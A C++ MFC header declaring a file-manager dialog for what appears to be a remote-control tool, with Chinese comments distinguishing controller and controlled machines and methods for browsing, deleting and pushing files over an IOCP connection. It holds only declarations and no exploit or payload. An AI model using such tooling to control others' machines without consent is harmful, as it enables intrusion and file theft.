#pragma once
#include "_IOCPServer.h"
#include "Common.h"
#include "TrueColorToolBar.h"
#include "afxcmn.h"
#include "afxwin.h"

// CDlgFileManager 对话框

typedef struct
{
	DWORD FileSizeHigh;
	DWORD FileSizeLow;
}FILE_SIZE;

#define MAKEINT64(low,high)  ((unsigned __int64)(((DWORD)(low))|((unsigned __int64)((DWORD)(high)))<<32))
typedef CList<CString, CString&>List;
class CDlgFileManager : public CDialog
{
	DECLARE_DYNAMIC(CDlgFileManager)

public:
	CDlgFileManager(CWnd* pParent = NULL, _CIOCPServer* IOCPServer = NULL, PCONTEXT_OBJECT ContextObject = NULL);   // 标准构造函数
	virtual ~CDlgFileManager();

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_DIALOG_FILE_MANAGER };
#endif
private:
	_CIOCPServer* m_IOCPServer;
	PCONTEXT_OBJECT m_ContextObject;
	HICON m_IconHwnd;
	BYTE m_ClientData[0x1000];
	BYTE m_ServerData[0x1000];
	
	CString m_ServerFileFullPath;
	CString m_ClientFileFullPath;
	//界面相关
	CImageList* m_CImageList_Large;
	CImageList* m_CImageList_Small;
	CTrueColorToolBar m_ToolBar_Dialog_File_Manager_Server_File;   //两个工具栏
	CTrueColorToolBar m_ToolBar_Dialog_File_Manager_Client_File;

	CListCtrl m_CListCtrl_Dialog_File_Manager_Server_File;   //两个列表框
	CListCtrl m_CListCtrl_Dialog_File_Manager_Client_File;
	CStatusBar        m_StatusBar;
	CProgressCtrl*    m_ProgressCtrl;

	CStatic m_CStatic_Dialog_File_Manager_Server_Position;
	CStatic m_CStatic_Dialog_File_Manager_Client_Position;
	CComboBox m_CComboBox_Dialog_File_Manager_Server_File;
	CComboBox m_CComboBox_Dialog_File_Manager_Client_File;
	//文件拖拽拷贝
	CListCtrl* m_DragListControl;  //文件拖拽过程  服务端
	CListCtrl* m_DropListControl;  //文件拖拽过程  客户端
	HCURSOR    m_CursorHwnd;    //鼠标图标
	BOOL       m_IsDragging = FALSE;    //拖拽文件
	BOOL       m_IsStop = FALSE;      //拷贝文件的过程中可以停止
	List       m_ServerDataToClientJob;   //所有传送任务
	CString    m_SourFileFullPath;   //游走任务
	CString    m_DestFileFullPath;
	__int64    m_TransferFileLength;  //当前操作文件的总大小
	ULONG      m_TransferMode = TRANSFER_MODE_NORMAL;
	//进度条
	__int64    m_Counter;
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	VOID CDlgFileManager::FixedServerVolumeData();
	VOID CDlgFileManager::FixedClientVolumeData();
	VOID CDlgFileManager::FixedServerFileData(CString Directory = "");
	VOID CDlgFileManager::GetClientFileData(CString Directory = "");
	VOID CDlgFileManager::FixedClientFileData(BYTE* BufferData, ULONG BufferLength);
	int CDlgFileManager::GetIconIndex(LPCTSTR VolumnName, DWORD FileAttributes);
	CString CDlgFileManager::GetParentDirectory(CString FileFullPath);
	void CDlgFileManager::WindowHandleIO(void);

	afx_msg void OnNMDblclkListDialogFileManagerServerFile(NMHDR *pNMHDR, LRESULT *pResult);
	afx_msg void OnNMDblclkListDialogFileManagerClientFile(NMHDR *pNMHDR, LRESULT *pResult);
	//主控端按钮功能
	afx_msg void OnFileManagerServerFilePrevious();
	afx_msg void OnFileManagerServerFileDelete();
	afx_msg void OnFileManagerServerFileNewFolder();
	afx_msg void OnFileManagerServerFileStop();
	afx_msg void OnFileManagerServerFileViewSmall();
	afx_msg void OnFileManagerServerFileViewList();
	afx_msg void OnFileManagerServerFileViewDetail();

	//客户端按钮功能
	afx_msg void OnFileManagerClientFilePrevious();
	afx_msg void OnFileManagerClientFileDelete();
	afx_msg void OnFileManagerClientFileNewFolder();
	afx_msg void OnFileManagerClientFileStop();
	afx_msg void OnFileManagerClientFileViewSmall();
	afx_msg void OnFileManagerClientFileViewList();
	afx_msg void OnFileManagerClientFileViewDetail();

	void CDlgFileManager::EnableControl(BOOL IsEnable);
	BOOL CDlgFileManager::DeleteDirectory(LPCTSTR DirectoryFullPath);
	BOOL CDlgFileManager::MakeSureDirectoryPathExists(char* DirectoryFullPath);
	afx_msg void OnMouseMove(UINT nFlags, CPoint point);
	afx_msg void OnLvnBegindragListDialogFileManagerServerFile(NMHDR *pNMHDR, LRESULT *pResult);  //从服务端到客户端的文件传输
	afx_msg void OnLButtonUp(UINT nFlags, CPoint point);
	VOID CDlgFileManager::DropDataOnList();  //判断数据从哪里来 分别调用函数
	VOID CDlgFileManager::CopyServerDataToClient();  //从主控端到客户端
	BOOL CDlgFileManager::FixedServerDataToClient(LPCTSTR DirectoryFullPath);  //遍历目录中的数据
	BOOL CDlgFileManager::SendServerDataToClient();  //发送数据到被控端
	VOID CDlgFileManager::SendTransferMode();  //若被控端有同名文件
	VOID CDlgFileManager::EndCopyServerFileToClient();  //结束拷贝
	void CDlgFileManager::ShowProgress();
	VOID CDlgFileManager::SendServerFileDataToClient();
};
